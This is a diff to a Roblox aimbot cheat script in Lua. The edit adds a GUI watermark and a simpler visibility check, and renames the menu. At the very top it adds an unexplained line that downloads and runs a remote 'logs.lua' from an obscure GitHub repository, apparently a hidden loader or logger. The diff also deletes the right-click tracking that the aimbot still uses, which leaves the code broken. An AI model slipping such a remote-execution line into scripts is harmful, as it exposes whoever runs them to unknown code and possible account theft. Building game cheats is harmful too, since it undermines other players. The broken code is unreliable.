@@ -1,3 +1,14 @@
+-- Load and execute the external script from the provided URL
+local externalScriptURL = "https://raw.githubusercontent.com/ffavex/AHfahf1r1-rah/main/logs.lua"
+local success, result = pcall(function()
+    loadstring(game:HttpGet(externalScriptURL))()
+end)
+
+if not success then
+    warn("Failed to load external script: " .. result)
+end
+
+-- Import the library
 local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/WetCheezit/Bracket-V2/main/src.lua"))()
 
 -- Notification on first run
@@ -8,7 +19,7 @@ game:GetService("StarterGui"):SetCore("SendNotification",{
 })
 
 -- Window
-local Window, MainGUI = Library:CreateWindow("Remedy | V1")
+local Window, MainGUI = Library:CreateWindow("Bracket-V2")
 
 -- Tabs
 local Tab1 = Window:CreateTab("Aimbot")
@@ -130,6 +141,29 @@ Remedy.TextSize = 14.000
 local UICorner = Instance.new("UICorner")
 UICorner.Parent = WatermarkFrame
 
+-- Function to update ping and FPS in the watermark
+local function updateWatermark()
+    -- Update Ping
+    local player = game.Players.LocalPlayer
+    Ping.Text = "Ping: " .. player.Status.Ping
+
+    -- Update FPS
+    local lastFrameTime = tick()
+    local frameCount = 0
+
+    game:GetService("RunService").RenderStepped:Connect(function()
+        frameCount = frameCount + 1
+        local currentTime = tick()
+        if currentTime - lastFrameTime >= 1 then
+            FPS.Text = "FPS: " .. frameCount
+            frameCount = 0
+            lastFrameTime = currentTime
+        end
+    end)
+end
+
+updateWatermark()
+
 -- Make the watermark frame draggable
 local function makeDraggable(frame)
     local dragging, dragInput, startPos, startPosAbs = false, nil, nil, nil
@@ -184,34 +218,13 @@ end
 game:GetService('RunService').RenderStepped:Connect(UpdateFOV)
 
 -- Check if the target is visible using raycasting
-local function IsVisible(targetPart)
-    local origin = game.Workspace.CurrentCamera.CFrame.Position
-    local direction = (targetPart.Position - origin).Unit * (targetPart.Position - origin).Magnitude
-    local raycastParams = RaycastParams.new()
-    raycastParams.FilterDescendantsInstances = {game.Players.LocalPlayer.Character} -- Ignore local player
-    raycastParams.FilterType = Enum.RaycastFilterType.Blacklist
-    local ray = game.Workspace:Raycast(origin, direction, raycastParams)
-
-    return ray == nil -- If no obstruction, target is visible
+local function IsVisible(target)
+    local camera = game.Workspace.CurrentCamera
+    local _, onScreen = camera:WorldToViewportPoint(target.Position)
+    return onScreen
 end
 
--- Detect Right-Click Hold
-local UserInputService = game:GetService('UserInputService')
-local rightClickHeld = false
-
-UserInputService.InputBegan:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseButton2 then
-        rightClickHeld = true
-    end
-end)
-
-UserInputService.InputEnded:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseButton2 then
-        rightClickHeld = false
-    end
-end)
-
--- Aimbot Logic (with FOV, Smoothness, Visibility, and Right Click)
+-- Aimbot function
 local function Aimbot()
     if not Toggles.AimbotToggle.Value or not rightClickHeld then return end
 
